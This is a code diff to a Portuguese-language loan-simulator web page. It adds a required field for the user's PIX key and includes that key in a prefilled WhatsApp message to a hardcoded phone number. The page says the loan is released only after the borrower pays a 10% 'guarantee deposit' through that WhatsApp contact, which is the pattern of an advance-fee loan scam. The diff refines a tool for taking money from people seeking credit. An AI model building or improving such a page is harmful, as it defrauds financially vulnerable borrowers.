@@ -21,9 +21,11 @@
         <label>Valor desejado (R$ 200 a R$ 8.000)</label>
         <input type="number" id="valor" min="200" max="8000" placeholder="Ex: 1000">
 
+        <label>Chave PIX para Recebimento</label>
+        <input type="text" id="pix" placeholder="Digite sua chave PIX aqui">
+
         <label>Número de Parcelas</label>
-        <select id="parcelas">
-            </select>
+        <select id="parcelas"></select>
 
         <button class="btn-simular" onclick="simular()">Simular Agora</button>
 
@@ -31,14 +33,14 @@
             <p><strong>Valor solicitado:</strong> R$ <span id="valSol"></span></p>
             <p><strong>Parcela:</strong> <span id="numParc"></span>x de <strong>R$ <span id="valParc"></span></strong></p>
             <p><strong>Entrada de Garantia:</strong> R$ <span id="valEntrada"></span></p>
+            <p><strong>Chave PIX:</strong> <span id="chavePix"></span></p>
             <br>
             <p style="font-size: 12px; color: #64748b;">Para liberar seu empréstimo, é necessário o pagamento da entrada de garantia.</p>
-            <a id="linkPagamento" href="#" style="display:block; text-align:center; background:#22c55e; color:white; padding:10px; border-radius:8px; text-decoration:none; margin-top:10px;">Pagar Entrada via WhatsApp</a>
+            <a id="linkPagamento" href="#" style="display:block; text-align:center; background:#22c55e; color:white; padding:10px; border-radius:8px; text-decoration:none;">Pagar Entrada via WhatsApp</a>
         </div>
     </div>
 
     <script>
-        // Cria automaticamente as opções de 1x a 24x
         const select = document.getElementById('parcelas');
         for (let i = 1; i <= 24; i++) {
             let opt = document.createElement('option');
@@ -50,23 +52,23 @@
         function simular() {
             let valor = parseFloat(document.getElementById('valor').value);
             let nParcelas = parseInt(document.getElementById('parcelas').value);
+            let pix = document.getElementById('pix').value;
             
             if(valor < 200 || valor > 8000) { alert("Valor deve ser entre 200 e 8000"); return; }
+            if(pix.trim() === "") { alert("Por favor, informe sua chave PIX"); return; }
             
-            // Cálculo: Valor + 30% de juros, dividido pelo número de parcelas
             let valorComJuros = valor * 1.30;
             let valorParcela = valorComJuros / nParcelas;
-            
-            // Entrada de garantia (10% do valor original)
             let entrada = valor * 0.10; 
             
             document.getElementById('valSol').innerText = valor.toFixed(2);
             document.getElementById('numParc').innerText = nParcelas;
             document.getElementById('valParc').innerText = valorParcela.toFixed(2);
             document.getElementById('valEntrada').innerText = entrada.toFixed(2);
+            document.getElementById('chavePix').innerText = pix;
             document.getElementById('resultado').style.display = 'block';
             
-            let msg = `Olá, quero liberar um empréstimo de R$ ${valor}. Escolhi ${nParcelas}x de R$ ${valorParcela.toFixed(2)}. O valor da entrada é R$ ${entrada.toFixed(2)}. Como faço o pagamento da entrada?`;
+            let msg = `Olá! Quero liberar um empréstimo de R$ ${valor.toFixed(2)}. Escolhi ${nParcelas}x de R$ ${valorParcela.toFixed(2)}. O valor da entrada é R$ ${entrada.toFixed(2)}. Minha chave PIX para recebimento é: ${pix}. Como faço o pagamento da entrada?`;
             document.getElementById('linkPagamento').href = "https://wa.me/5532987194791?text=" + encodeURIComponent(msg);
         }
     </script>
